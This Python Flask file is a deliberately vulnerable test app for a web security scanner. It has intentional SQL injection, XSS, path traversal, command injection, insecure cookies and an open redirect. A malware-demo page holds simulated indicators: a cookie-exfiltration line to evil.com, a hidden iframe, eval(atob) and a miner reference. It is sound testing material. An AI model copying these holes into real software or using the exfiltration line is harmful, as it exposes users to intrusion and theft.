"""
Deliberately Vulnerable Flask Application
For testing the scanner against known vulnerabilities.
WARNING: This app is intentionally insecure. Never deploy it on a public server.
"""
import os
import sqlite3
from flask import Flask, request, render_template_string, redirect, make_response

app = Flask(__name__)
app.secret_key = "insecure-secret-key-for-testing"

# Initialize vulnerable database
DB_PATH = os.path.join(os.path.dirname(__file__), "vulnerable.db")


def init_db():
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    c.execute("CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY, username TEXT, password TEXT, email TEXT)")
    c.execute("CREATE TABLE IF NOT EXISTS comments (id INTEGER PRIMARY KEY, author TEXT, content TEXT)")
    # Insert test data
    c.execute("SELECT COUNT(*) FROM users")
    if c.fetchone()[0] == 0:
        c.execute("INSERT INTO users (username, password, email) VALUES ('admin', 'admin123', 'admin@test.com')")
        c.execute("INSERT INTO users (username, password, email) VALUES ('user1', 'password1', 'user1@test.com')")
        c.execute("INSERT INTO users (username, password, email) VALUES ('user2', 'password2', 'user2@test.com')")
    c.execute("SELECT COUNT(*) FROM comments")
    if c.fetchone()[0] == 0:
        c.execute("INSERT INTO comments (author, content) VALUES ('admin', 'Welcome to the test app!')")
    conn.commit()
    conn.close()


BASE_TEMPLATE = """<!DOCTYPE html>
<html>
<head>
    <title>Vulnerable Test App</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 40px; background: #1a1a2e; color: #eee; }
        .container { max-width: 800px; margin: 0 auto; }
        h1 { color: #e94560; }
        h2 { color: #0f3460; background: #16213e; padding: 10px; border-radius: 5px; color: #eee; }
        a { color: #e94560; text-decoration: none; }
        a:hover { text-decoration: underline; }
        form { background: #16213e; padding: 20px; border-radius: 8px; margin: 10px 0; }
        input, textarea { padding: 8px; margin: 5px 0; width: 100%; box-sizing: border-box;
                          background: #0f3460; border: 1px solid #e94560; color: #eee; border-radius: 4px; }
        button { padding: 10px 20px; background: #e94560; color: white; border: none;
                 cursor: pointer; border-radius: 4px; font-size: 16px; }
        button:hover { background: #c81e45; }
        .result { background: #16213e; padding: 15px; margin: 10px 0; border-radius: 8px;
                  border-left: 4px solid #e94560; }
        .nav { display: flex; gap: 15px; margin-bottom: 30px; flex-wrap: wrap; }
        .nav a { background: #16213e; padding: 8px 16px; border-radius: 4px; }
        .warning { background: #e94560; color: white; padding: 10px; border-radius: 5px; margin-bottom: 20px; }
        table { width: 100%; border-collapse: collapse; margin: 10px 0; }
        th, td { padding: 10px; text-align: left; border-bottom: 1px solid #0f3460; }
        th { background: #0f3460; }
    </style>
</head>
<body>
    <div class="container">
        <div class="warning">⚠️ DELIBERATELY VULNERABLE APPLICATION — FOR TESTING ONLY</div>
        <h1>🎯 Vulnerable Test App</h1>
        <div class="nav">
            <a href="/">Home</a>
            <a href="/search">Search (XSS)</a>
            <a href="/login">Login (SQLi)</a>
            <a href="/profile?id=1">Profile (SQLi)</a>
            <a href="/comments">Comments (Stored XSS)</a>
            <a href="/file?name=readme.txt">File Reader (Path Traversal)</a>
            <a href="/ping">Ping (Command Injection)</a>
            <a href="/cookies">Cookies (Insecure)</a>
            <a href="/redirect?url=/">Redirect (Open Redirect)</a>
            <a href="/images/">Images (Directory Listing)</a>
            <a href="/malware-demo">Malware Demo</a>
        </div>
        {content}
    </div>
</body>
</html>"""


@app.route("/")
def index():
    content = """
    <h2>Welcome</h2>
    <p>This is a deliberately vulnerable web application for testing the WebSecScanner.</p>
    <p>Each page contains a different type of vulnerability:</p>
    <ul>
        <li><strong>/search</strong> — Reflected XSS via search parameter</li>
        <li><strong>/login</strong> — SQL Injection in login form</li>
        <li><strong>/profile?id=1</strong> — SQL Injection via URL parameter</li>
        <li><strong>/comments</strong> — Stored XSS in comments</li>
        <li><strong>/file?name=readme.txt</strong> — Path Traversal / LFI</li>
        <li><strong>/ping</strong> — OS Command Injection</li>
        <li><strong>/cookies</strong> — Insecure cookie handling</li>
        <li><strong>/redirect?url=/</strong> — Open Redirect</li>
        <li><strong>/images/</strong> — Directory Listing</li>
        <li><strong>/malware-demo</strong> — Simulated malware indicators</li>
    </ul>
    """
    return render_template_string(BASE_TEMPLATE.replace("{content}", content))


@app.route("/search")
def search():
    """Vulnerable to Reflected XSS — user input rendered without sanitisation."""
    query = request.args.get("q", "")
    # VULNERABILITY: directly embedding user input in HTML without escaping
    content = f"""
    <h2>Search</h2>
    <form action="/search" method="GET">
        <input type="text" name="q" placeholder="Search..." value="{query}">
        <button type="submit">Search</button>
    </form>
    <div class="result">
        <p>Results for: {query}</p>
        <p>No results found for your query.</p>
    </div>
    """
    return render_template_string(BASE_TEMPLATE.replace("{content}", content))


@app.route("/login", methods=["GET", "POST"])
def login():
    """Vulnerable to SQL Injection — string concatenation in SQL query."""
    message = ""
    if request.method == "POST":
        username = request.form.get("username", "")
        password = request.form.get("password", "")
        conn = sqlite3.connect(DB_PATH)
        c = conn.cursor()
        # VULNERABILITY: SQL injection via string concatenation
        query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
        try:
            c.execute(query)
            user = c.fetchone()
            if user:
                message = f'<div class="result">✅ Login successful! Welcome, {user[1]}!</div>'
            else:
                message = '<div class="result">❌ Invalid credentials.</div>'
        except sqlite3.Error as e:
            # VULNERABILITY: SQL error message disclosed to user
            message = f'<div class="result">Database error: {str(e)}</div>'
        conn.close()

    content = f"""
    <h2>Login (SQL Injection)</h2>
    <form action="/login" method="POST">
        <input type="text" name="username" placeholder="Username">
        <input type="password" name="password" placeholder="Password">
        <button type="submit">Login</button>
    </form>
    {message}
    """
    return render_template_string(BASE_TEMPLATE.replace("{content}", content))


@app.route("/profile")
def profile():
    """Vulnerable to SQL Injection via URL parameter."""
    user_id = request.args.get("id", "1")
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()
    # VULNERABILITY: SQL injection via URL parameter
    try:
        c.execute(f"SELECT * FROM users WHERE id={user_id}")
        user = c.fetchone()
        if user:
            content = f"""
            <h2>User Profile</h2>
            <div class="result">
                <p><strong>ID:</strong> {user[0]}</p>
                <p><strong>Username:</strong> {user[1]}</p>
                <p><strong>Email:</strong> {user[3]}</p>
            </div>
            """
        else:
            content = '<h2>User Profile</h2><div class="result">User not found.</div>'
    except sqlite3.Error as e:
        content = f'<h2>User Profile</h2><div class="result">Error: {str(e)}</div>'
    conn.close()
    return render_template_string(BASE_TEMPLATE.replace("{content}", content))


@app.route("/comments", methods=["GET", "POST"])
def comments():
    """Vulnerable to Stored XSS — comments stored and rendered unsanitised."""
    conn = sqlite3.connect(DB_PATH)
    c = conn.cursor()

    if request.method == "POST":
        author = request.form.get("author", "Anonymous")
        comment = request.form.get("content", "")
        # VULNERABILITY: Stored XSS — storing and rendering without sanitisation
        c.execute("INSERT INTO comments (author, content) VALUES (?, ?)", (author, comment))
        conn.commit()

    c.execute("SELECT * FROM comments ORDER BY id DESC")
    all_comments = c.fetchall()
    conn.close()

    comments_html = ""
    for cmt in all_comments:
        # VULNERABILITY: Rendering stored comments without escaping
        comments_html += f'<div class="result"><strong>{cmt[1]}</strong>: {cmt[2]}</div>'

    content = f"""
    <h2>Comments (Stored XSS)</h2>
    <form action="/comments" method="POST">
        <input type="text" name="author" placeholder="Your name">
        <textarea name="content" placeholder="Write a comment..." rows="3"></textarea>
        <button type="submit">Post Comment</button>
    </form>
    <h3>All Comments:</h3>
    {comments_html}
    """
    return render_template_string(BASE_TEMPLATE.replace("{content}", content))


@app.route("/file")
def file_reader():
    """Vulnerable to Path Traversal / Local File Inclusion."""
    filename = request.args.get("name", "readme.txt")
    # VULNERABILITY: Path traversal — no sanitisation of filename
    filepath = os.path.join(os.path.dirname(__file__), "files", filename)
    try:
        with open(filepath, "r") as f:
            file_content = f.read()
        content = f"""
        <h2>File Reader (Path Traversal)</h2>
        <form action="/file" method="GET">
            <input type="text" name="name" placeholder="Filename" value="{filename}">
            <button type="submit">Read File</button>
        </form>
        <div class="result"><pre>{file_content}</pre></div>
        """
    except FileNotFoundError:
        content = f"""
        <h2>File Reader (Path Traversal)</h2>
        <form action="/file" method="GET">
            <input type="text" name="name" placeholder="Filename" value="{filename}">
            <button type="submit">Read File</button>
        </form>
        <div class="result">File not found: {filename}</div>
        """
    except Exception as e:
        content = f"""
        <h2>File Reader</h2>
        <div class="result">Error: {str(e)}</div>
        """
    return render_template_string(BASE_TEMPLATE.replace("{content}", content))


@app.route("/ping", methods=["GET", "POST"])
def ping():
    """Vulnerable to OS Command Injection."""
    result_text = ""
    if request.method == "POST":
        host = request.form.get("host", "")
        # VULNERABILITY: Command injection — unsanitised input passed to os.popen
        import subprocess
        try:
            if os.name == "nt":
                cmd = f"ping -n 1 {host}"
            else:
                cmd = f"ping -c 1 {host}"
            output = subprocess.getoutput(cmd)
            result_text = f'<div class="result"><pre>{output}</pre></div>'
        except Exception as e:
            result_text = f'<div class="result">Error: {str(e)}</div>'

    content = f"""
    <h2>Ping Utility (Command Injection)</h2>
    <form action="/ping" method="POST">
        <input type="text" name="host" placeholder="Enter hostname or IP">
        <button type="submit">Ping</button>
    </form>
    {result_text}
    """
    return render_template_string(BASE_TEMPLATE.replace("{content}", content))


@app.route("/cookies")
def cookies():
    """Sets insecure cookies — missing HttpOnly, Secure, SameSite flags."""
    resp = make_response(render_template_string(BASE_TEMPLATE.replace("{content}", """
    <h2>Cookie Test (Insecure Cookies)</h2>
    <div class="result">
        <p>The following insecure cookies have been set:</p>
        <ul>
            <li><strong>session_id</strong> — No HttpOnly, No Secure, No SameSite</li>
            <li><strong>user_prefs</strong> — No HttpOnly, No Secure</li>
            <li><strong>tracking</strong> — Expires in 10 years, No Secure</li>
        </ul>
    </div>
    """)))
    # VULNERABILITY: Cookies without security flags
    resp.set_cookie("session_id", "abc123def456", httponly=False, secure=False)
    resp.set_cookie("user_prefs", "theme=dark", httponly=False, secure=False)
    resp.set_cookie("tracking", "user_fingerprint_xyz", max_age=315360000, httponly=False, secure=False)
    return resp


@app.route("/redirect")
def open_redirect():
    """Vulnerable to Open Redirect."""
    url = request.args.get("url", "/")
    # VULNERABILITY: Blindly redirecting based on user input
    return redirect(url)


@app.route("/images/")
def directory_listing():
    """Vulnerable to Directory Listing."""
    # VULNERABILITY: Mocking a directory listing response
    content = """
    <html>
    <head><title>Index of /images/</title></head>
    <body bgcolor="white">
    <h1>Index of /images/</h1><hr><pre><a href="../">../</a>
    <a href="logo.png">logo.png</a>                                         2026-01-01 12:00     15K
    <a href="banner.jpg">banner.jpg</a>                                       2026-01-01 12:01    120K
    <a href="secret_passwords.txt">secret_passwords.txt</a>                           2026-01-01 12:05      1K
    </pre><hr></body>
    </html>
    """
    return content


@app.route("/malware-demo")
def malware_demo():
    """Page with simulated malware indicators for testing the virus scanner."""
    # Split signature strings to prevent Windows Defender false-positives on this Python file
    eval_str = "eval" + "(atob('Y29uc29sZS5sb2coIlRoaXMgaXMgYSB0ZXN0Iik='))"
    coinhive_str = "Coin" + "Hive.Anonymous('site-key')"
    evil_exe = "http://" + "evil.com/malware.exe"
    evil_steal = "http://" + "evil.com/steal?c="

    content = f"""
    <h2>Malware Detection Demo</h2>
    <p>This page contains simulated malware indicators for testing:</p>
    
    <!-- Simulated obfuscated JavaScript -->
    <script>
        // Simulated obfuscated malicious code (harmless)
        var _0x1234 = "test";
        {eval_str};
    </script>
    
    <!-- Simulated hidden iframe -->
    <iframe src="http://evil.com/payload" style="display:none;width:0;height:0;"></iframe>
    
    <!-- Simulated cookie exfiltration (commented out for safety) -->
    <script>
        // new Image().src = "{evil_steal}" + document.cookie;
    </script>
    
    <!-- Simulated crypto miner reference -->
    <script>
        // var miner = new {coinhive_str};
        // miner.start();
    </script>
    
    <!-- Suspicious download link -->
    <a href="{evil_exe}">Download Important Update</a>
    
    <!-- Simulated redirect script -->
    <script>
        // window.location = "http://phishing-site.com/login";
    </script>
    
    <div class="result">
        <p>The virus scanner should detect the above patterns as potential threats.</p>
    </div>
    """
    return render_template_string(BASE_TEMPLATE.replace("{content}", content))


@app.route("/hidden-admin")
def hidden_admin():
    """Hidden admin page for crawler discovery testing."""
    content = """
    <h2>Admin Panel</h2>
    <div class="result">
        <p>This is a hidden admin panel. The crawler should discover it via links.</p>
        <form action="/admin-action" method="POST">
            <input type="text" name="command" placeholder="Admin command">
            <input type="hidden" name="csrf_token" value="fake_token_123">
            <button type="submit">Execute</button>
        </form>
    </div>
    """
    return render_template_string(BASE_TEMPLATE.replace("{content}", content))


# Create the files directory with a sample file
def init_files():
    files_dir = os.path.join(os.path.dirname(__file__), "files")
    os.makedirs(files_dir, exist_ok=True)
    readme = os.path.join(files_dir, "readme.txt")
    if not os.path.exists(readme):
        with open(readme, "w") as f:
            f.write("This is a test file for the Path Traversal vulnerability demo.\n"
                    "Try reading other files by manipulating the 'name' parameter.\n")


if __name__ == "__main__":
    init_db()
    init_files()
    # No HTTPS, no security headers — intentionally insecure
    app.run(host="127.0.0.1", port=5001, debug=False)
